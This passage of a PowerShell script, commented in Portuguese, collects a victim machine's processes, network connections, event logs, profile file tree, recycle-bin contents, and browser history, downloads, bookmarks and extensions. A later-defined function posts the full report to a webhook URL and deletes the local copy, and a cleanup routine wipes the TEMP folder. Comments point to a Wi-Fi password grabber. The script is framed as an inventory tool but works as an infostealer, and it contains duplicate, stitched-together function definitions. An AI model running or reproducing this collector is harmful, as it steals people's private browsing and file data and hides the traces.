        if($mapped) { & $add ''; & $add 'DRIVES MAPEADOS:'; $mapped | ForEach-Object { & $add "  - $($_.Name): -> $($_.DisplayRoot)" } }

        # =====================================================================
        # 10. PROCESSOS / DIAGNÓSTICO
        # =====================================================================
        $sectionTimer = Get-Date
        & $sectionStart '10. Processos e diagnóstico'
        & $sec '## 10. PROCESSOS / DIAGNÓSTICO'
        & $log 'INFO' 'Coletando processos e conexões locais.'
        $proc = & $try { Get-Process -ErrorAction Stop | Sort-Object WorkingSet64 -Descending | Select-Object -First 30 }
        if($proc) {
            $proc | ForEach-Object {
                $cpuTime = & $try { $_.CPU }
                $cpuText = if($null -eq $cpuTime){'-'}else{ & $safeRound $cpuTime,1 }
                & $add "  - $($_.ProcessName) | PID: $($_.Id) | Mem: $(& $safeRound ($_.WorkingSet64/1MB),1) MB | CPU: ${cpuText}s"
            }
        }

        $listen = & $try { netstat -ano 2>$null | Select-String LISTENING | Select-Object -First 50 }
        if($listen) { & $add ''; & $add 'PORTAS EM ESCUTA:'; $listen | ForEach-Object { & $add "  - $($_.Line.Trim())" } }

        $est = & $try { netstat -ano 2>$null | Select-String ESTABLISHED | Select-Object -First 50 }
        if($est) { & $add ''; & $add 'CONEXÕES ESTABELECIDAS:'; $est | ForEach-Object { & $add "  - $($_.Line.Trim())" } }

        $events = & $try { Get-WinEvent -FilterHashtable @{LogName='System';Level=1,2;StartTime=(Get-Date).AddDays(-7)} -MaxEvents 50 -ErrorAction Stop }
        if($events) {
            & $add ''; & $add 'ERROS/CRÍTICOS DO SYSTEM (7 DIAS):'
            $events | ForEach-Object {
                $message = if($_.Message){ $_.Message -replace '\s+',' ' } else { '' }
                if($message.Length -gt 180){ $message = $message.Substring(0,180) }
                & $add "  - $($_.TimeCreated) | ID $($_.Id) | $($_.ProviderName) | $message"
            }
        }

        $appEvents = & $try { Get-WinEvent -FilterHashtable @{LogName='Application';Level=1,2;StartTime=(Get-Date).AddDays(-7)} -MaxEvents 50 -ErrorAction Stop }
        if($appEvents) {
            & $add ''; & $add 'ERROS/CRÍTICOS DE APLICATIVOS (7 DIAS):'
            $appEvents | ForEach-Object {
                $message = if($_.Message){ $_.Message -replace '\s+',' ' } else { '' }
                if($message.Length -gt 180){ $message = $message.Substring(0,180) }
                & $add "  - $($_.TimeCreated) | ID $($_.Id) | $($_.ProviderName) | $message"
            }
        }

        $dumps = & $try { Get-ChildItem "$env:SystemRoot\Minidump\*.dmp" -Force -ErrorAction Stop | Where-Object { -not $_.PSIsContainer } }
        if($dumps) {
            & $add ''; & $add 'MINIDUMPS:'
            $dumps | Sort-Object LastWriteTime -Descending | Select-Object -First 20 | ForEach-Object {
                & $add "  - $($_.FullName) | $($_.LastWriteTime) | $(& $safeRound ($_.Length/1MB),1) MB"
            }
        }

        # =====================================================================
        # 11. ARQUIVOS PRINCIPAIS DO PERFIL / LIXEIRA / DESKTOP
        # =====================================================================
        $sectionTimer = Get-Date
        & $sectionStart '11. Arquivos principais do perfil / Lixeira / Desktop'
        & $sec '## 11. ÁRVORE DE ARQUIVOS DO PERFIL / DESKTOP / LIXEIRA'
    $sectionTimer = Get-Date
    & $sectionStart '11. Árvore de arquivos do perfil / Desktop / Lixeira'

    # Coleta controlada:
    # - somente as pastas principais do perfil;
    # - até 2 níveis abaixo de cada pasta principal;
    # - não usa Get-ChildItem -Recurse;
    # - representação em árvore;
    # - limite preventivo por diretório.

    $profileRoot = [Environment]::GetFolderPath('UserProfile')

    $mainProfileFolders = @(
        'Desktop',
        'Documents',
        'Downloads',
        'Pictures',
        'Music',
        'Videos',
        'Favorites',
        'Contacts',
        'Links',
        'Saved Games'
    )

    $maxDepth = 2
    $maxItemsPerDirectory = 150

    function Write-TreeDirectory {
        param(
            [Parameter(Mandatory=$true)]
            [string]$Path,

            [Parameter(Mandatory=$true)]
            [int]$Depth,

            [Parameter(Mandatory=$true)]
            [string]$Prefix,

            [Parameter(Mandatory=$true)]
            [int]$MaxDepth,

            [Parameter(Mandatory=$true)]
            [int]$MaxItems
        )

        if($Depth -gt $MaxDepth) {
            return
        }

        try {
            $children = @(Get-ChildItem -LiteralPath $Path -Force -ErrorAction Stop |
                Sort-Object -Property PSIsContainer,Name)

            $total = $children.Count
            $shown = [Math]::Min($total,$MaxItems)
            $index = 0

            # Os caracteres da árvore são construídos numericamente para
            # evitar que o caractere pipe seja interpretado como operador.
            $pipe = [string][char]124
            $slash = [string][char]92

            foreach($item in ($children | Select-Object -First $MaxItems)) {
                $index++

                if($index -eq $shown) {
                    $branch = $slash + '-- '
                    $childPrefix = $Prefix + '    '
                }
                else {
                    $branch = $pipe + '-- '
                    $childPrefix = $Prefix + $pipe + '   '
                }

                if($item.PSIsContainer) {
                    [void]$sb.AppendLine(
                        ('{0}{1}[PASTA] {2}' -f $Prefix,$branch,$item.Name)
                    )

                    if($Depth -lt $MaxDepth) {
                        Write-TreeDirectory `
                            -Path $item.FullName `
                            -Depth ($Depth + 1) `
                            -Prefix $childPrefix `
                            -MaxDepth $MaxDepth `
                            -MaxItems $MaxItems
                    }
                }
                else {
                    if($item.Extension -eq '.lnk') {
                        $fileType = 'ATALHO'
                    }
                    else {
                        $fileType = 'ARQUIVO'
                    }

                    $sizeText = ''
                    try {
                        $sizeText = (' | {0:N0} bytes' -f [double]$item.Length)
                    }
                    catch {
                        $sizeText = ''
                    }

                    [void]$sb.AppendLine(
                        ('{0}{1}[{2}] {3}{4}' -f $Prefix,$branch,$fileType,$item.Name,$sizeText)
                    )
                }
            }

            if($total -gt $MaxItems) {
                [void]$sb.AppendLine(
                    ('{0}    ... {1} item(ns) omitido(s) neste diretório (limite={2}).' -f $Prefix,($total-$MaxItems),$MaxItems)
                )
            }
        }
        catch {
            [void]$sb.AppendLine(
                ('{0}    [ERRO] Não foi possível listar: {1}' -f $Prefix,$_.Exception.Message)
            )
            & $log 'WARN' ("Falha ao listar diretório {0}: {1}" -f $Path,$_.Exception.Message)
        }
    }

    [void]$sb.AppendLine('')
    [void]$sb.AppendLine('============================================================')
    [void]$sb.AppendLine('ÁRVORE DE ARQUIVOS E PASTAS DO PERFIL')
    [void]$sb.AppendLine('============================================================')
    [void]$sb.AppendLine(('Raiz: {0}' -f $profileRoot))
    [void]$sb.AppendLine(('Profundidade máxima: {0} níveis abaixo de cada pasta principal' -f $maxDepth))
    [void]$sb.AppendLine('')

    foreach($folderName in $mainProfileFolders) {
        $folderPath = Join-Path $profileRoot $folderName

        if(-not (Test-Path -LiteralPath $folderPath -PathType Container)) {
            [void]$sb.AppendLine(
                ('[NÃO ENCONTRADA] {0}' -f $folderName)
            )
            continue
        }

        [void]$sb.AppendLine(
            ('{0}\' -f $folderName)
        )

        Write-TreeDirectory `
            -Path $folderPath `
            -Depth 1 `
            -Prefix '' `
            -MaxDepth $maxDepth `
            -MaxItems $maxItemsPerDirectory

        [void]$sb.AppendLine('')
    }

    & $log 'INFO' ("Árvore do perfil concluída. Profundidade máxima={0}; limite por diretório={1}" -f $maxDepth,$maxItemsPerDirectory)

    [void]$sb.AppendLine('')
    [void]$sb.AppendLine('============================================================')
    [void]$sb.AppendLine('ÁRVORE DA ÁREA DE TRABALHO')
    [void]$sb.AppendLine('============================================================')
    [void]$sb.AppendLine('')

    $desktopPath = [Environment]::GetFolderPath('Desktop')

    if([string]::IsNullOrWhiteSpace($desktopPath)) {
        $desktopPath = Join-Path $profileRoot 'Desktop'
    }

    if(Test-Path -LiteralPath $desktopPath -PathType Container) {
        [void]$sb.AppendLine('Desktop\')

        Write-TreeDirectory `
            -Path $desktopPath `
            -Depth 1 `
            -Prefix '' `
            -MaxDepth $maxDepth `
            -MaxItems $maxItemsPerDirectory
    }
    else {
        [void]$sb.AppendLine('[DESKTOP NÃO ENCONTRADO]')
        & $log 'WARN' ("Desktop não encontrado: {0}" -f $desktopPath)
    }

    [void]$sb.AppendLine('')
    [void]$sb.AppendLine('============================================================')
    [void]$sb.AppendLine('LIXEIRA')
    [void]$sb.AppendLine('============================================================')
    [void]$sb.AppendLine('')

    try {
        $shell = New-Object -ComObject Shell.Application -ErrorAction Stop
        $recycleBin = $shell.Namespace(0xA)

        if($null -eq $recycleBin) {
            [void]$sb.AppendLine('[NÃO FOI POSSÍVEL ACESSAR A LIXEIRA]')
            & $log 'WARN' 'Shell.Application não retornou a Lixeira.'
        }
        else {
            $recycleItems = @($recycleBin.Items())

            if($recycleItems.Count -eq 0) {
                [void]$sb.AppendLine('[LIXEIRA VAZIA]')
            }
            else {
                [void]$sb.AppendLine('Lixeira\')

                $index = 0
                $shownRecycle = [Math]::Min($recycleItems.Count,$maxItemsPerDirectory)
                $pipe = [string][char]124
                $slash = [string][char]92

                foreach($item in ($recycleItems | Select-Object -First $maxItemsPerDirectory)) {
                    $index++

                    if($index -eq $shownRecycle) {
                        $branch = $slash + '-- '
                    }
                    else {
                        $branch = $pipe + '-- '
                    }

                    try {
                        [void]$sb.AppendLine(
                            ('{0}[ITEM] {1}' -f $branch,$item.Name)
                        )
                    }
                    catch {
                        [void]$sb.AppendLine(
                            ('{0}[ITEM] (nome indisponível)' -f $branch)
                        )
                    }
                }

                if($recycleItems.Count -gt $maxItemsPerDirectory) {
                    [void]$sb.AppendLine(
                        ('    ... {0} item(ns) omitido(s) na Lixeira.' -f ($recycleItems.Count-$maxItemsPerDirectory))
                    )
                }
            }

            & $log 'INFO' ("Lixeira processada: itens encontrados={0}" -f $recycleItems.Count)
        }
    }
    catch {
        [void]$sb.AppendLine(
            ('[ERRO] Não foi possível consultar a Lixeira: {0}' -f $_.Exception.Message)
        )
        & $log 'WARN' ("Falha ao consultar Lixeira: {0}" -f $_.Exception.Message)
    }

    & $sectionEnd '11. Árvore de arquivos do perfil / Desktop / Lixeira' ([int]((Get-Date) - $sectionTimer).TotalSeconds)

    & $sec '## 12. NAVEGADORES / HISTÓRICO / DOWNLOADS / FAVORITOS / EXTENSÕES'

        $browserRoots = @(
            [pscustomobject]@{ Name='Google Chrome'; UserRoot=(Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data') },
            [pscustomobject]@{ Name='Microsoft Edge'; UserRoot=(Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data') },
            [pscustomobject]@{ Name='Mozilla Firefox'; UserRoot=(Join-Path $env:APPDATA 'Mozilla\Firefox\Profiles') }
        )

        $browserTotal = 0

        foreach($browser in $browserRoots) {
            if(-not (Test-Path $browser.UserRoot -PathType Container)) {
                & $log 'INFO' "$($browser.Name): diretório não encontrado. Pulando."
                continue
            }

            $browserStart = Get-Date
            & $log 'INFO' "$($browser.Name): diretório encontrado. Procurando perfis."

            & $add ''
            & $add $browser.Name.ToUpper()
            & $add ('-' * 78)

            if($browser.Name -ne 'Mozilla Firefox') {
                $profiles = & $try {
                    & $getDirectories $browser.UserRoot |
                        Where-Object {
                            $_.Name -eq 'Default' -or $_.Name -like 'Profile *'
                        } |
                        Sort-Object Name
                }

                if(-not $profiles) {
                    & $log 'WARN' "$($browser.Name): nenhum perfil Chromium encontrado."
                    & $add '  [nenhum perfil encontrado]'
                    continue
                }

                foreach($profile in @($profiles)) {
                    $profileStart = Get-Date
                    $profileName = $profile.Name

                    & $log 'INFO' "$($browser.Name) / ${profileName}: processando perfil."
                    & $add ''
                    & $add "PERFIL: $profileName"

                    # ---------------------------------------------------------
                    # HISTÓRICO + DOWNLOADS
                    # ---------------------------------------------------------
                    $historyDb = Join-Path $profile.FullName 'History'

                    if(Test-Path $historyDb -PathType Leaf) {
                        & $log 'INFO' "$($browser.Name) / ${profileName}: banco History localizado."

                        if($sqliteProvider -or $sqliteExe) {
                            # A consulta usa aliases estáveis e já converte timestamps
                            # internos do Chromium para data/hora legível.
                            $historyQuery = @"
SELECT
    datetime((v.visit_time/1000000)-11644473600,'unixepoch','localtime') AS Data,
    COALESCE(u.title,'') AS Titulo,
    u.url AS URL,
    COALESCE(v.transition,'') AS Transition
FROM visits v
INNER JOIN urls u ON v.url=u.id
ORDER BY v.visit_time DESC
LIMIT $BrowserEntries;
"@

                            $hist = & $invokeBrowserSQLite `
                                $historyDb `
                                $historyQuery `
                                "$($browser.Name) / $profileName / Histórico"

                            $count = & $writeSqlRows `
                                $hist `
                                'HISTÓRICO DE NAVEGAÇÃO' `
                                @('Data','Titulo','URL','Transition')

                            $browserTotal += $count

                            # O schema de downloads varia entre versões.
                            # Primeiro tenta o schema moderno.
                            $downloadQuery = @"
SELECT
    datetime((start_time/1000000)-11644473600,'unixepoch','localtime') AS Data,
    COALESCE(target_path,'') AS Arquivo,
    COALESCE(tab_url,'') AS URL,
    COALESCE(total_bytes,0) AS Bytes
FROM downloads
ORDER BY start_time DESC
LIMIT $BrowserEntries;
"@

                            $dl = & $invokeBrowserSQLite `
                                $historyDb `
                                $downloadQuery `
                                "$($browser.Name) / $profileName / Downloads"

                            if(-not $dl) {
                                # Compatibilidade com schemas mais antigos.
                                $downloadQueryOld = @"
SELECT
    datetime((start_time/1000000)-11644473600,'unixepoch','localtime') AS Data,
    COALESCE(full_path,'') AS Arquivo,
    COALESCE(tab_url,'') AS URL,
    COALESCE(total_bytes,0) AS Bytes
FROM downloads
ORDER BY start_time DESC
LIMIT $BrowserEntries;
"@
                                $dl = & $invokeBrowserSQLite `
                                    $historyDb `
                                    $downloadQueryOld `
                                    "$($browser.Name) / $profileName / Downloads (schema antigo)"
                            }

                            & $writeSqlRows `
                                $dl `
                                'DOWNLOADS DO NAVEGADOR' `
                                @('Data','Arquivo','URL','Bytes')
                        }
                        else {
                            & $log 'WARN' ("{0} / {1}: nenhum mecanismo SQLite disponível." -f $browser.Name,$profileName)
                            & $add '  [SQLite não disponível para converter o banco em dados legíveis]'
                        }
                    }
                    else {
                        & $log 'INFO' ("{0} / {1}: banco History não encontrado." -f $browser.Name,$profileName)
                        & $add '  [banco History não encontrado]'
                    }

                    # ---------------------------------------------------------
                    # FAVORITOS — JSON, não SQL
                    # ---------------------------------------------------------
                    $bookmark = Join-Path $profile.FullName 'Bookmarks'

                    if(Test-Path $bookmark -PathType Leaf) {
                        & $log 'INFO' ("{0} / {1}: convertendo Bookmarks JSON." -f $browser.Name,$profileName)

                        & $add ''
                        & $add 'FAVORITOS'
                        & $add ('-' * 60)

                        try {
                            $bookmarkText = [System.IO.File]::ReadAllText($bookmark)
                            if($null -eq $bookmarkText) { throw 'Arquivo Bookmarks não pôde ser lido.' }
                            $json = $bookmarkText | ConvertFrom-Json

                            $bookmarkCount = 0

                            $walkBookmark = {
                                param($node)

                                if($node.children) {
                                    foreach($child in @($node.children)) {
                                        if($child.type -eq 'url') {
                                            $bookmarkCount++
                                            & $add "  - Nome: $($child.name) | URL: $($child.url)"
                                        }

                                        if($child.children) {
                                            & $walkBookmark $child
                                        }
                                    }
                                }
                            }

                            if($json.roots) {
                                foreach($root in $json.roots.PSObject.Properties) {
                                    if($root.Value) {
                                        & $walkBookmark $root.Value
                                    }
                                }
                            }

                            & $log 'INFO' ("{0} / {1}: favoritos convertidos={2}." -f $browser.Name,$profileName,$bookmarkCount)
                        }
                        catch {
                            & $log 'WARN' ("{0} / {1}: erro ao converter Bookmarks: {2}" -f $browser.Name,$profileName,$_.Exception.Message)
                            & $add '  [não foi possível interpretar o arquivo de favoritos]'
                        }
                    }

                    # ---------------------------------------------------------
                    # EXTENSÕES
                    # ---------------------------------------------------------
                    $extRoot = Join-Path $profile.FullName 'Extensions'

                    if(Test-Path $extRoot -PathType Container) {
                        & $log 'INFO' ("{0} / {1}: procurando extensões." -f $browser.Name,$profileName)

                        & $add ''
                        & $add 'EXTENSÕES / PLUGINS'
                        & $add ('-' * 60)

                        $extensions = & $getDirectories $extRoot

                        foreach($ext in @($extensions)) {
                            # Procura manifest sem depender de -File.
                            $manifest = & $try {
                                Get-ChildItem -Path $ext.FullName -Recurse -Force -ErrorAction SilentlyContinue |
                                    Where-Object {
                                        (-not $_.PSIsContainer) -and $_.Name -eq 'manifest.json'
                                    } |
                                    Select-Object -First 1
                            }

                            if($manifest) {
                                try {
                                    $manifestText = [System.IO.File]::ReadAllText($manifest.FullName)
                                    if($null -eq $manifestText) { throw 'manifest.json não pôde ser lido.' }
                                    $m = $manifestText | ConvertFrom-Json
                                    $name = if($m.name) { [string]$m.name } else { $ext.Name }

                                    if($name -match '^__MSG_') {
                                        $name = $ext.Name
                                    }

                                    & $add "  - Nome: $name | Versão: $($m.version) | ID: $($ext.Name)"
                                }
                                catch {
                                    & $add "  - ID: $($ext.Name) | [manifest não pôde ser interpretado]"
                                }
                            }
                            else {
                                & $add "  - ID: $($ext.Name)"
                            }
                        }
                    }

                    $elapsed = [int]((Get-Date) - $profileStart).TotalSeconds
                    & $log 'INFO' "$($browser.Name) / ${profileName}: perfil concluído em ${elapsed}s."
                }
            }
            else {
                # -------------------------------------------------------------
                # FIREFOX
                # -------------------------------------------------------------
                $profiles = & $try {
                    & $getDirectories $browser.UserRoot | Sort-Object Name
                }

                if(-not $profiles) {
                    & $log 'WARN' 'Firefox: nenhum perfil encontrado.'
                    & $add '  [nenhum perfil encontrado]'
                    continue
                }

                foreach($profile in @($profiles)) {
                    $profileStart = Get-Date
                    $profileName = $profile.Name

                    & $log 'INFO' "Mozilla Firefox / ${profileName}: processando perfil."
                    & $add ''
                    & $add "PERFIL: $profileName"

                    $places = Join-Path $profile.FullName 'places.sqlite'

                    if(Test-Path $places -PathType Leaf) {
                        if($sqliteProvider -or $sqliteExe) {
                            $firefoxHistoryQuery = @"
SELECT
    datetime(h.visit_date/1000000,'unixepoch','localtime') AS Data,
    COALESCE(p.title,'') AS Titulo,
    p.url AS URL
FROM moz_historyvisits h
INNER JOIN moz_places p ON h.place_id=p.id
ORDER BY h.visit_date DESC
LIMIT $BrowserEntries;
"@

                            $hist = & $invokeBrowserSQLite `
                                $places `
                                $firefoxHistoryQuery `
                                "Mozilla Firefox / $profileName / Histórico"

                            $count = & $writeSqlRows `
                                $hist `
                                'HISTÓRICO DE NAVEGAÇÃO' `
                                @('Data','Titulo','URL')

                            $browserTotal += $count

                            $firefoxBookmarksQuery = @"
SELECT
    COALESCE(b.title,'') AS Titulo,
    p.url AS URL,
    datetime(b.dateAdded/1000000,'unixepoch','localtime') AS Data
FROM moz_bookmarks b
INNER JOIN moz_places p ON b.fk=p.id
WHERE b.type=1
ORDER BY b.dateAdded DESC
LIMIT $BrowserEntries;
"@

                            $fav = & $invokeBrowserSQLite `
                                $places `
                                $firefoxBookmarksQuery `
                                "Mozilla Firefox / $profileName / Favoritos"

                            & $writeSqlRows `
                                $fav `
                                'FAVORITOS' `
                                @('Data','Titulo','URL')
                        }
                        else {
                            & $log 'WARN' ("Mozilla Firefox / {0}: SQLite não disponível." -f $profileName)
                            & $add '  [SQLite não disponível para converter places.sqlite]'
                        }
                    }
                    else {
                        & $log 'INFO' "Mozilla Firefox / ${profileName}: places.sqlite não encontrado."
                        & $add '  [places.sqlite não encontrado]'
                    }

                    $addons = Join-Path $profile.FullName 'extensions.json'

                    if(Test-Path $addons -PathType Leaf) {
                        & $add ''
                        & $add 'EXTENSÕES / PLUGINS'
                        & $add ('-' * 60)

                        try {
                            $addonText = [System.IO.File]::ReadAllText($addons)
                            if($null -eq $addonText) { throw 'Arquivo extensions.json não pôde ser lido.' }
                            $j = $addonText | ConvertFrom-Json

                            $addonCount = 0

                            if($j.addons) {
                                foreach($addon in @($j.addons)) {
                                    if($addon.active -or $addon.userDisabled -eq $false) {
                                        $name = if($addon.defaultLocale.name) {
                                            $addon.defaultLocale.name
                                        } else {
                                            $addon.id
                                        }

                                        & $add "  - Nome: $name | Versão: $($addon.version) | ID: $($addon.id)"
                                        $addonCount++
                                    }
                                }
                            }

                            & $log 'INFO' "Mozilla Firefox / ${profileName}: extensões convertidas=$addonCount."
                        }
                        catch {
                            & $log 'WARN' "Mozilla Firefox / ${profileName}: erro ao converter extensions.json: $($_.Exception.Message)"
                            & $add '  [não foi possível interpretar extensions.json]'
                        }
                    }

                    $elapsed = [int]((Get-Date) - $profileStart).TotalSeconds
                    & $log 'INFO' "Mozilla Firefox / ${profileName}: perfil concluído em ${elapsed}s."
                }
            }

            $browserElapsed = [int]((Get-Date) - $browserStart).TotalSeconds
            & $log 'INFO' "$($browser.Name): coleta concluída em ${browserElapsed}s."
        }

        & $log 'INFO' "Navegadores: total de registros de histórico processados=$browserTotal."

        # =====================================================================
        # 13. AMBIENTE
        # =====================================================================
        $sectionTimer = Get-Date
        & $sectionStart '13. Ambiente'
        & $sec '## 13. AMBIENTE'
        foreach($n in 'PATH','APPDATA','PROGRAMDATA','SYSTEMDRIVE','SYSTEMROOT','TEMP','TMP','USERNAME','COMPUTERNAME') {
            $v = [Environment]::GetEnvironmentVariable($n)
            if($v) {
                $v = if($v.Length -gt 80){ $v.Substring(0,40)+'...'+$v.Substring($v.Length-30) } else { $v }
                & $add "  $n = $v"
            }
        }

        & $add ''
        & $add 'LOG DE EXECUÇÃO'
        & $add ('-' * 78)
        & $add "Arquivo de log: $logFile"
        & $add "Mecanismo SQLite: $(if($sqliteProvider){$sqliteProvider}elseif($sqliteExe){'sqlite3.exe'}else{'não disponível'})"
        & $add ''
        & $add $sep
        & $add 'FIM DO RELATÓRIO'
        & $add $sep

        & $log 'INFO' 'Coleta de dados concluida. Preparando gravacao do relatorio.'

        if(-not $ExportDir) {
            $ExportDir = Split-Path $OutputFile -Parent
        }

        if($ExportDir -and -not (Test-Path $ExportDir -PathType Container)) {
            New-Item $ExportDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
        }

        $outputParent = Split-Path $OutputFile -Parent
        if($outputParent -and -not (Test-Path $outputParent -PathType Container)) {
            New-Item $outputParent -ItemType Directory -Force -ErrorAction Stop | Out-Null
        }

        $fullOutput = [System.IO.Path]::GetFullPath([string]$OutputFile)
        $utf8 = New-Object -TypeName System.Text.UTF8Encoding -ArgumentList $false
        [System.IO.File]::WriteAllText($fullOutput, $sb.ToString(), $utf8)

        if(!(Test-Path $fullOutput -PathType Leaf)) {
            throw "O arquivo de relatório não foi criado."
        }

        $elapsedTotal = [int]((Get-Date) - $scriptStart).TotalSeconds
        & $log 'INFO' "Relatório gravado com sucesso: $fullOutput"
        & $log 'INFO' "Coleta encerrada. Tempo total=${elapsedTotal}s."

        Write-Host "Relatório salvo em: $fullOutput"
        Write-Host "Log detalhado: $logFile"
        return $fullOutput
    }
    catch {
        $errorMessage = $_.Exception.Message
        try {
            & $log 'ERROR' ("Falha fatal na geração/gravação do relatório: {0}" -f $errorMessage)
        } catch {}

        Write-Error ("Falha ao gerar/salvar relatório em '{0}': {1}" -f $OutputFile,$errorMessage)

        # Importante: não retorna um caminho inexistente. O chamador receberá
        # uma exceção e poderá interromper o envio do arquivo.
        throw
    }
    finally {
        $ErrorActionPreference = $oldErrorActionPreference
    }
}

##############################################################################

function send_file_to_webhook {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath,
        [Parameter(Mandatory=$false)]
        [string]$WebhookUrl,
        [string]$Titulo = 'Relatório de inventário'
    )

    if(!(Test-Path $FilePath -PathType Leaf)) {
        throw "Arquivo de relatório não existe: $FilePath"
    }

    $localPath = (Resolve-Path $FilePath).Path
    Write-Warning "Envio automático para webhook está desativado nesta versão."
    Write-Host "Relatório disponível localmente em: $localPath"

    return @{
        FileSent = $null
        Webhook = $null
        Time = Get-Date
        Titulo = $Titulo
        LocalFile = $localPath
    }
}

######### Chama a funcao e salva o arquivo $OutFile em $ExportDir #########
function Invoke-DataDump {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [scriptblock]$DumpCommand,

        [Parameter(Mandatory = $true)]
        [string]$OutputFile,

        [Parameter(Mandatory = $false)]
        [string]$ExportDir
    )

    try {
        # Executa o comando passado via ScriptBlock
        $out = &$DumpCommand

        # Se o comando não retornar o caminho em texto, usa o OutputFile
        if ([string]::IsNullOrWhiteSpace([string]$out)) {
            if(Test-Path $OutputFile -PathType Leaf) {
                $out = (Resolve-Path $OutputFile).Path
            }
            else {
                throw "A coleta terminou sem gerar o arquivo esperado: $OutputFile"
            }
        }

        $resolvedOutput = $null

        if($out -is [System.Array]) {
            $candidate = $out | Where-Object {
                $_ -is [string] -and -not [string]::IsNullOrWhiteSpace([string]$_)
            } | Select-Object -Last 1
        }
        else {
            $candidate = $out
        }

        if($candidate) {
            try {
                $resolvedOutput = (Resolve-Path -LiteralPath ([string]$candidate) -ErrorAction Stop).Path
            }
            catch {
                $resolvedOutput = $null
            }
        }

        if(-not $resolvedOutput) {
            try {
                $resolvedOutput = (Resolve-Path -LiteralPath $OutputFile -ErrorAction Stop).Path
            }
            catch {
                throw "A coleta terminou, mas o arquivo de saída não existe: $OutputFile"
            }
        }

        if(-not (Test-Path -LiteralPath $resolvedOutput -PathType Leaf)) {
            throw "A coleta terminou sem gerar um arquivo válido: $resolvedOutput"
        }

        Write-Host "Arquivo gerado em: $resolvedOutput"
        return $resolvedOutput
    } catch {
        throw "Erro ao gerar arquivo: $($_.Exception.Message)"
    }
}


##############################################################################
##############################################################################
##############################################################################

function send_file_to_webhook {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath,                     # caminho completo ou nome de arquivo dentro de %TEMP%

        [Parameter(Mandatory=$true)]
        [string]$WebhookUrl,                   # URL do webhook para onde enviar

        [string]$Titulo = [System.IO.Path]::GetFileName($FilePath), # parâmetro de título com fallback para o nome do arquivo

        [string]$ExportDir = $ExportDirDefault,  # pasta de exportação (a mesma usada por get_wifi_pass)
        [switch]$RemoveExportDir                # se setado, remove a pasta ExportDir após envio
    )

    # Resolve o caminho do arquivo
    $resolvedPath = $null
    if ([System.IO.Path]::IsPathRooted($FilePath)) {
        if (Test-Path -Path $FilePath -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $FilePath).ProviderPath
        } else {
            throw "Arquivo informado não existe: $FilePath"
        }
    } else {
        $candidate1 = Join-Path $env:TEMP $FilePath
        $candidate2 = Join-Path $ExportDir $FilePath

        if (Test-Path -Path $candidate1 -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $candidate1).ProviderPath
        } elseif (Test-Path -Path $candidate2 -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $candidate2).ProviderPath
        } else {
            throw "Arquivo '$FilePath' não encontrado em %TEMP% nem em $ExportDir."
        }
    }

    # Envia e apaga o arquivo após envio
    try {
        # Lê o conteúdo do arquivo
        $fileContent = Get-Content -Path $resolvedPath -Raw -Encoding UTF8

        # Monta a string no formato "Titulo: conteudo"
        $payloadText = "${Titulo}: ${fileContent}"

        # Converte a string montada para bytes UTF-8
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payloadText)

        # Envia a requisição
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'text/plain; charset=utf-8'

        # Remove o arquivo após envio
        if (Test-Path -Path $resolvedPath) {
            Remove-Item -Path $resolvedPath -Force -ErrorAction SilentlyContinue
        }
    } catch {
        throw "Falha ao enviar para webhook '$WebhookUrl': $_"
    } finally {
        # Remove exportdir apenas se solicitado explicitamente
        try {
            if ($RemoveExportDir.IsPresent) {
                if ((Test-Path -Path $ExportDir) -and ($ExportDir.StartsWith($env:TEMP))) {
                    Remove-Item -Path $ExportDir -Recurse -Force -ErrorAction SilentlyContinue
                }
            }
        } catch {
            Write-Verbose "Falha ao remover pasta de exportação: $_"
        }
    }

    return @{ FileSent = $resolvedPath; Webhook = $WebhookUrl; Time = (Get-Date); Titulo = $Titulo }
}


######### Chama a funcao e salva o arquivo $OutFile em $ExportDir #########
function Invoke-DataDump {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [scriptblock]$DumpCommand,

        [Parameter(Mandatory = $true)]
        [string]$OutputFile,

        [Parameter(Mandatory = $false)]
        [string]$ExportDir
    )

    try {
        # Executa o comando passado via ScriptBlock
        $out = &$DumpCommand

        # Se o comando não retornar o caminho em texto, usa o OutputFile
        if ([string]::IsNullOrWhiteSpace($out)) {
            $out =$OutputFile
        }

        Write-Host "Arquivo gerado em: $out"
        return $out
    } catch {
        Write-Error "Erro ao gerar arquivo: $_"
        exit 1
    }
}


####### Enviar ao Webhook ######
function Send-DumpToWebhook {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $false)]
        [string]$WebhookUrl,

        [Parameter(Mandatory = $false)]
        [string]$Title = "Relatório de Dump",

        [Parameter(Mandatory = $false)]
        [string]$ExportDir,

        [Parameter(Mandatory = $false)]
        [switch]$RemoveExportDir
    )

    # Executa apenas se a URL do Webhook for informada
    if (-not [string]::IsNullOrWhiteSpace($WebhookUrl)) {
        try {
            Write-Host "Enviando para webhook: $WebhookUrl"

            # Monta os parâmetros dinamicamente (Splatting)
            $splatParams = @{
                FilePath   = $FilePath
                WebhookUrl = $WebhookUrl
                Titulo     = $Title
            }

            if ($ExportDir) { $splatParams['ExportDir'] =$ExportDir }
            if ($RemoveExportDir) { $splatParams['RemoveExportDir'] =$true }

            # Executa a função interna de envio
            $sendResult = send_file_to_webhook @splatParams

            # Exibe o resultado checando o retorno do objeto
            if ($null -ne $sendResult) {$fileSent = if ($sendResult.PSObject.Properties['FileSent']) {$sendResult.FileSent } else { $FilePath }$timeSent = if ($sendResult.PSObject.Properties['Time']) {$sendResult.Time } else { (Get-Date) }

                Write-Host "Envio concluído: $fileSent em$timeSent"
            } else {
                Write-Host "Envio concluído com sucesso."
            }
        } catch {
            Write-Error "Erro durante envio para webhook: $_"
        }
    }
}

  

##### Funcao de Limpeza ####
function Clear-All {
    $ea = 'SilentlyContinue'
    rm "$env:TEMP\*" -r -fo -ea $ea
